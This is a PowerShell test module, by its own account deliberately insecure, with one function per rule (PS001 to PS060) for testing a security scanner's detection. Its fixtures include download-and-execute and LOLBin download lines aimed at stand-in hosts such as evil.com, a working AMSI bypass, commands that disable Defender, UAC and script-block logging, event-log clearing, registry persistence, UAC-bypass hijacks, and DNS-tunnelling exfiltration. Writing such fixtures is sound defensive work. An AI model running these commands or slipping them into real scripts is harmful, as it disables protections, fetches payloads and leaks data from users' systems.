<#
.SYNOPSIS
    Test module containing intentionally bad code to trigger all security scanner rules.

.DESCRIPTION
    This module contains examples of insecure PowerShell code patterns that should be detected
    by the security scanner. Each function demonstrates a specific security vulnerability.
    
    Coverage: 45 security rules (25 original + 20 new rules from v1.1.0)
    - PS001-PS040: Original security detection rules
    - PS041-PS060: New 2025 threat intelligence rules (AMSI bypass, CLM bypass, reflective injection, etc.)
    
    ⚠️ WARNING: This code is intentionally insecure and should NEVER be used in production!
    
.NOTES
    Purpose: Testing security scanner detection capabilities
    Version: 1.1.0
    All code in this module violates security best practices intentionally
    Last Updated: 2025-11-25
#>

#region PS001 - Invoke-Expression Usage (High Severity)
function Invoke-UnsafeExpression {
    param([string]$Command)
    
    # VIOLATION: PS001 - Using Invoke-Expression
    Invoke-Expression $Command
}
#endregion

#region PS002 - Add-Type Usage (Info Severity)
function Add-UnsafeType {
    # VIOLATION: PS002 - Using Add-Type
    $code = @'
    public class UnsafeClass {
        public static string Execute(string cmd) {
            return "Executed: " + cmd;
        }
    }
'@
    Add-Type -TypeDefinition $code
}
#endregion

#region PS003 - Start-Process with Variable Command (Medium Severity)
function Start-VariableProcess {
    param([string]$ExecutablePath)
    
    # VIOLATION: PS003 - Start-Process with variable command
    Start-Process -FilePath $ExecutablePath
}
#endregion

#region PS009 - Hardcoded Credentials (Low Severity)
function Get-HardcodedPassword {
    # VIOLATION: PS009 - Hardcoded credentials with actual credential-like values
    # Pattern 1: Long base64-like strings (>20 chars, alphanumeric + / + = only)
    $apikey = "dGhpc0lzQVNlY3JldEFQSUtleVRoYXRJc0Jhc2U2NEVuY29kZWQ="
    
    # Pattern 2: Long hex strings (32+ chars, hex only)
    $secret = "a1b2c3d4e5f6789012345678901234567890abcdef123456"
    
    # Pattern 3: UUIDs as API keys (with matching variable name)
    $token = "550e8400-e29b-41d4-a716-446655440000"
    
    # Pattern 4: Complex passwords (>10 chars, mixed case, numbers, no spaces, no symbols)
    $password = "MySecretPassw0rd123"
    $key = "Tr0ub4dorExample99"
    
    return $apikey
}
#endregion

#region PS010 - ConvertTo-SecureString with PlainText (High Severity)
function ConvertTo-InsecureString {
    # VIOLATION: PS010 - Using -AsPlainText
    $plainPassword = "Password123"
    $securePassword = ConvertTo-SecureString $plainPassword -AsPlainText -Force
    
    return $securePassword
}
#endregion

#region PS011 - Username and Password Parameters (Medium Severity)
function Connect-WithBadCredentials {
    # VIOLATION: PS011 - Separate Username and Password parameters
    param(
        [string]$Username,
        [string]$Password
    )
    
    Write-Host "Connecting with $Username"
}
#endregion

#region PS012 - Credential Logging (Low Severity)
function Write-CredentialToLog {
    param([string]$Password, [string]$ApiKey)
    
    # VIOLATION: PS012 - Logging credentials with Write-Host, Write-Output, Write-Verbose, Write-Debug, Out-File, Add-Content, Set-Content
    Write-Verbose "User password is: $Password"
    Write-Host "API Key: $ApiKey"
    Write-Output "Secret token: $Password"
    Write-Debug "Credentials: $Password"
    $Password | Out-File -FilePath "credentials.log"
    Add-Content -Path "log.txt" -Value "Password: $Password"
    Set-Content -Path "config.log" -Value "ApiKey: $ApiKey"
}
#endregion

#region PS014 - Weak Hash Algorithm (Low Severity)
function Get-WeakHash {
    param([string]$Data)
    
    # VIOLATION: PS014 - Using MD5, SHA1, SHA-1
    $algorithmMD5 = "MD5"
    $algorithmSHA1 = "SHA1"
    $algorithmSHA_1 = "SHA-1"
    
    $md5 = [System.Security.Cryptography.MD5]::Create()
    $sha1 = [System.Security.Cryptography.SHA1]::Create()
    
    $hashMD5 = $md5.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Data))
    $hashSHA1 = $sha1.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Data))
    
    return $hashMD5, $hashSHA1
}
#endregion

#region PS015 - Weak Encryption Algorithm (High Severity)
function Protect-WithWeakEncryption {
    param([string]$Data)
    
    # VIOLATION: PS015 - Using DES, TripleDES, RC2, RC4
    $algorithmDES = "DES"
    $algorithmTripleDES = "TripleDES"
    $algorithmRC2 = "RC2"
    $algorithmRC4 = "RC4"
    
    $des = [System.Security.Cryptography.DES]::Create()
    $tripledes = [System.Security.Cryptography.TripleDES]::Create()
    $rc2 = [System.Security.Cryptography.RC2]::Create()
    
    return $des
}
#endregion

#region PS018 - Unencrypted Authentication (Critical Severity)
function Invoke-UnencryptedAuth {
    # VIOLATION: PS018 - AllowUnencryptedAuthentication
    Invoke-Command -ComputerName "server01" -ScriptBlock { Get-Process } -AllowUnencryptedAuthentication
}
#endregion

#region PS019 - Certificate Validation Bypass (Critical Severity)
function Skip-CertificateValidation {
    # VIOLATION: PS019 - Bypassing certificate validation
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    
    Invoke-WebRequest -Uri "https://untrusted-site.com"
}
#endregion

#region PS020 - HTTP Instead of HTTPS (Medium Severity)
function Get-InsecureWebContent {
    # VIOLATION: PS020 - Using HTTP instead of HTTPS
    $url = "http://example.com/api/data"
    Invoke-WebRequest -Uri $url
}
#endregion

#region PS021 - Unsafe Deserialization (Low Severity)
function Import-UntrustedData {
    param([string]$FilePath)
    
    # VIOLATION: PS021 - Unsafe deserialization
    $data = Import-Clixml -Path $FilePath
    return $data
}
#endregion

#region PS024 - Path Traversal Risk (High Severity)
function Get-UnsafeFileContent {
    param([string]$FileName)
    
    # VIOLATION: PS024 - Path traversal risk
    $path = "C:\Data\" + $FileName
    Get-Content -Path $path
    Set-Content -Path $path -Value "Modified"
    Remove-Item -Path $path -Force
}
#endregion

#region PS027 - Base64 Encoding (Medium Severity)
function Invoke-EncodedCommand {
    # VIOLATION: PS027 - Base64 encoding/decoding: FromBase64String, ToBase64String, -EncodedCommand, -enc
    $encodedCommand = "RwBlAHQALQBQAHIAbwBjAGUAcwBzAA=="
    $bytes = [System.Convert]::FromBase64String($encodedCommand)
    $command = [System.Text.Encoding]::Unicode.GetString($bytes)
    $encoded = [System.Convert]::ToBase64String($bytes)
    
    # Also using -EncodedCommand and -enc parameters
    powershell.exe -EncodedCommand $encodedCommand
    powershell.exe -enc $encodedCommand
}
#endregion

#region PS028 - High Entropy Strings (Low Severity)
function Use-HighEntropyString {
    # VIOLATION: PS028 - High entropy string
    $suspiciousString = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    
    return $suspiciousString
}
#endregion

#region PS030 - Download and Execute Pattern (Critical Severity)
function Invoke-DownloadAndExecute {
    # VIOLATION: PS030 - Download and execute
    $wc = New-Object System.Net.WebClient
    $script = $wc.DownloadString("http://malicious-site.com/script.ps1")
    Invoke-Expression $script
    
    # Alternative pattern
    $data = $wc.DownloadData("http://malicious-site.com/payload.bin")
}
#endregion

#region PS031 - Disabled Security Features (High Severity)
function Disable-SecurityFeatures {
    # VIOLATION: PS031 - Disabling Windows Defender
    Set-MpPreference -DisableRealtimeMonitoring $true
    Set-MpPreference -DisableIntrusionPreventionSystem $true
}
#endregion

#region PS031B - Registry-Based Security Disabling (High Severity)
function Disable-UAC {
    # VIOLATION: PS031B - Disabling UAC via registry
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1
}
#endregion

#region PS032 - Registry Persistence (Medium Severity)
function Add-RegistryPersistence {
    param([string]$ScriptPath)
    
    # VIOLATION: PS032 - Registry Run key modification
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyApp" -Value $ScriptPath
}
#endregion

#region PS033 - Scheduled Task Creation (Medium Severity)
function New-PersistentTask {
    # VIOLATION: PS033 - Scheduled task creation
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\script.ps1"
    $trigger = New-ScheduledTaskTrigger -AtStartup
    Register-ScheduledTask -TaskName "MyTask" -Action $action -Trigger $trigger
}
#endregion

#region PS036 - Empty Catch Block (Low Severity)
function Invoke-WithEmptyCatch {
    # VIOLATION: PS036 - Empty catch block
    try {
        Get-Process -Name "NonExistent"
    }
    catch {
        # Empty catch - no error handling
    }
}
#endregion

#region PS037 - Missing CmdletBinding (Info Severity)
# VIOLATION: PS037 - Missing CmdletBinding attribute
function Get-WithoutCmdletBinding {
    param([string]$Name)
    
    return $Name
}
#endregion

#region PS039 - Global Variable Usage (Low Severity)
function Set-GlobalVariable {
    # VIOLATION: PS039 - Global variable usage
    $global:UnsafeVariable = "This is global"
    $global:Counter = 0
}
#endregion

#region PS040 - Unapproved Verb Usage (Info Severity)
# VIOLATION: PS040 - Using unapproved verb
function Delete-OldFiles {
    param([string]$Path)
    
    # Should use Remove-OldFiles instead
    Get-ChildItem -Path $Path | Remove-Item
}

function Retrieve-Data {
    # Should use Get-Data instead
    return "Data"
}

function Change-Settings {
    # Should use Set-Settings instead
    Write-Host "Settings changed"
}
#endregion

#region PS041 - .NET Reflection Assembly Loading (High Severity)
function Invoke-ReflectionLoading {
    # VIOLATION: PS041 - Loading assembly from byte array (suspicious pattern)
    $assemblyBytes = [byte[]]@(77, 90, 144, 0)  # PE header bytes
    [System.Reflection.Assembly]::Load($assemblyBytes)
    
    # Also triggers on reflection usage
    [Reflection.Assembly]::LoadFile("C:\temp\malicious.dll")
}
#endregion

#region PS042 - COM Object Creation (Medium Severity)
function New-SuspiciousCOMObject {
    # VIOLATION: PS042 - Creating WScript.Shell COM object (can execute commands)
    $shell = New-Object -ComObject WScript.Shell
    
    # Another suspicious COM object
    $shellApp = New-Object -ComObject Shell.Application
}
#endregion

#region PS043 - WMI/CIM Command Execution (High Severity)
function Invoke-WMIExecution {
    param([string]$ComputerName = 'localhost')
    
    # VIOLATION: PS043 - Using WMI for command execution
    Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c calc.exe" -ComputerName $ComputerName
    
    # Also with CIM
    Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "notepad.exe"}
}
#endregion

#region PS044 - Script Block Logging Disabled (Critical Severity)
function Disable-ScriptBlockLogging {
    # VIOLATION: PS044 - Disabling PowerShell script block logging
    Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0
}
#endregion

#region PS045 - AMSI Bypass Attempt (Critical Severity)
function Invoke-AMSIBypass {
    # VIOLATION: PS045 - AMSI bypass technique
    $amsiContext = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $amsiField = $amsiContext.GetField('amsiInitFailed', 'NonPublic,Static')
    $amsiField.SetValue($null, $true)
}
#endregion

#region PS046 - Constrained Language Mode Bypass (Critical Severity)
function Test-LanguageModeBypass {
    # VIOLATION: PS046 - Attempting to bypass constrained language mode
    if ($ExecutionContext.SessionState.LanguageMode -eq 'ConstrainedLanguage') {
        $ExecutionContext.SessionState.LanguageMode = 'FullLanguage'
    }
}
#endregion

#region PS047 - Execution Policy Bypass (Medium Severity)
function Invoke-PolicyBypass {
    # VIOLATION: PS047 - Execution policy bypass
    $command = "powershell.exe -ExecutionPolicy Bypass -File malicious.ps1"
    
    # Alternative bypass
    $cmd2 = "powershell.exe -ep bypass -nop -c IEX(malicious code)"
}
#endregion

#region PS048 - Suspicious Encoded Command (High Severity)
function Invoke-EncodedCommand {
    # VIOLATION: PS048 - Using encoded command parameter
    $encodedCmd = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
    
    Start-Process powershell.exe -ArgumentList "-EncodedCommand $encodedCmd"
    
    # Short form
    & powershell -enc $encodedCmd
}
#endregion

#region PS049 - Reflective DLL Injection (Critical Severity)
function Invoke-ReflectiveInjection {
    # VIOLATION: PS049 - Reflective DLL injection technique
    $code = @'
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
'@
    Add-Type -MemberDefinition $code -Name "InjectionAPI" -Namespace Win32
}
#endregion

#region PS050 - Process Injection Techniques (Critical Severity)
function Invoke-ProcessInjection {
    # VIOLATION: PS050 - Process injection/hollowing
    $injectionCode = @'
    [DllImport("kernel32.dll")]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    
    [DllImport("ntdll.dll")]
    public static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);
    
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);
'@
    Add-Type -MemberDefinition $injectionCode -Name "ProcessHollowing" -Namespace Win32
}
#endregion

#region PS051 - Suspicious Web Request (Medium Severity)
function Invoke-SuspiciousWebRequest {
    # VIOLATION: PS051 - Web request to IP address (suspicious)
    Invoke-WebRequest -Uri "http://192.168.1.100/payload.exe" -OutFile "C:\temp\file.exe"
    
    # Request with encoded URL
    $encodedUrl = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cDovL2V2aWwuY29tL21hbHdhcmU="))
    Invoke-RestMethod -Uri $encodedUrl
}
#endregion

#region PS052 - Kerberos Ticket Manipulation (Critical Severity)
function Invoke-KerberosAttack {
    # VIOLATION: PS052 - Kerberos ticket manipulation (Mimikatz-style)
    $mimikatzCmd = "Invoke-Mimikatz -Command 'kerberos::ptt ticket.kirbi'"
    
    # Using Rubeus
    $rubeusCmd = ".\Rubeus.exe dump /nowrap"
    
    # Checking tickets
    klist purge
}
#endregion

#region PS053 - Windows Event Log Manipulation (High Severity)
function Clear-SecurityLogs {
    # VIOLATION: PS053 - Clearing event logs (anti-forensics)
    Clear-EventLog -LogName Security
    Clear-EventLog -LogName System
    
    # Disabling event logs
    wevtutil sl Security /e:false
    
    # Removing event logs
    Remove-EventLog -LogName CustomAppLog
}
#endregion

#region PS054 - Token Manipulation (High Severity)
function Invoke-TokenManipulation {
    # VIOLATION: PS054 - Access token manipulation for privilege escalation
    $tokenCode = @'
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool SetThreadToken(IntPtr Thread, IntPtr Token);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
'@
    Add-Type -MemberDefinition $tokenCode -Name "TokenAPI" -Namespace Win32
}
#endregion

#region PS055 - Living Off The Land Binaries (Medium Severity)
function Invoke-LOLBins {
    # VIOLATION: PS055 - Abusing legitimate Windows binaries
    
    # Using rundll32 for execution
    Start-Process rundll32.exe -ArgumentList "javascript:alert('xss')"
    
    # Using regsvr32 for execution
    regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll
    
    # Using mshta for execution
    mshta.exe "http://malicious.com/payload.hta"
    
    # Using certutil for download/decode
    certutil.exe -urlcache -split -f http://evil.com/malware.exe malware.exe
    certutil.exe -decode encoded.txt decoded.exe
    
    # Using bitsadmin for download
    bitsadmin.exe /transfer myDownload /download /priority high http://evil.com/payload.exe C:\temp\payload.exe
}
#endregion

#region PS056 - PowerShell Remoting Suspicious Usage (Medium Severity)
function Invoke-SuspiciousRemoting {
    param([string]$ComputerName = 'target-server')
    
    # VIOLATION: PS056 - PowerShell remoting (legitimate, but should be logged)
    Enter-PSSession -ComputerName $ComputerName
    
    # Creating persistent session
    $session = New-PSSession -ComputerName $ComputerName
    
    # Remote command execution
    Invoke-Command -ComputerName $ComputerName -ScriptBlock {
        # Suspicious: encoded command via remoting
        $enc = "base64encodedpayload"
        iex ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($enc)))
    }
}
#endregion

#region PS057 - UAC Bypass Techniques (High Severity)
function Invoke-UACBypass {
    # VIOLATION: PS057 - UAC bypass using eventvwr.exe
    Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(Default)" -Value "cmd.exe /c start calc.exe"
    Start-Process eventvwr.exe
    
    # UAC bypass using fodhelper
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "powershell.exe"
    Start-Process fodhelper.exe
    
    # UAC bypass using ComputerDefaults
    Start-Process ComputerDefaults.exe
    
    # UAC bypass using sdclt
    Start-Process sdclt.exe
}
#endregion

#region PS058 - Clipboard Access (Low Severity)
function Get-ClipboardData {
    # VIOLATION: PS058 - Accessing clipboard (data theft potential)
    $clipboardContent = Get-Clipboard
    
    # Saving clipboard to file
    Get-Clipboard | Out-File "C:\temp\stolen-clipboard.txt"
    
    # Setting clipboard (also monitored)
    Set-Clipboard -Value "Malicious content"
}
#endregion

#region PS059 - Screen Capture Attempt (Medium Severity)
function Invoke-ScreenCapture {
    # VIOLATION: PS059 - Screen capture functionality
    Add-Type -AssemblyName System.Drawing, System.Windows.Forms
    
    $screenBounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $screenshot = New-Object System.Drawing.Bitmap($screenBounds.Width, $screenBounds.Height)
    $graphics = [System.Drawing.Graphics]::FromImage($screenshot)
    $graphics.CopyFromScreen($screenBounds.Location, [System.Drawing.Point]::Empty, $screenBounds.Size)
    
    $screenshot.Save("C:\temp\screenshot.png")
}
#endregion

#region PS060 - DNS Tunneling Indicators (High Severity)
function Invoke-DNSTunneling {
    # VIOLATION: PS060 - DNS tunneling for data exfiltration
    $data = "sensitive-data-to-exfiltrate"
    $chunks = $data -split '(.{10})' | Where-Object { $_ }
    
    # Suspicious: DNS queries in a loop with data encoding
    foreach ($chunk in $chunks) {
        $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($chunk))
        $query = "$encoded.evil-c2-domain.com"
        Resolve-DnsName $query -ErrorAction SilentlyContinue
    }
    
    # Also using nslookup
    nslookup "exfil-data.attacker.com"
}
#endregion

#region Combined Violations - Multiple Issues
function Invoke-MultipleViolations {
    <#
    This function intentionally combines multiple security violations
    to test the scanner's ability to detect multiple issues in one function
    #>
    
    # PS009 - Hardcoded credentials
    $apiKey = "sk-proj-abcdef123456"
    
    # PS010 - PlainText SecureString
    $password = ConvertTo-SecureString "Admin123!" -AsPlainText -Force
    
    # PS020 - HTTP URL
    $url = "http://insecure-api.com/data"
    
    # PS019 - Certificate bypass
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    
    # PS030 - Download and execute
    $client = New-Object System.Net.WebClient
    $payload = $client.DownloadString($url)
    
    # PS001 - Invoke-Expression
    Invoke-Expression $payload
    
    # PS012 - Credential logging
    Write-Host "API Key used: $apiKey"
    
    # PS039 - Global variable
    $global:LastResult = $payload
}
#endregion

# Export functions (normally we wouldn't export these, but for testing purposes)
Export-ModuleMember -Function *
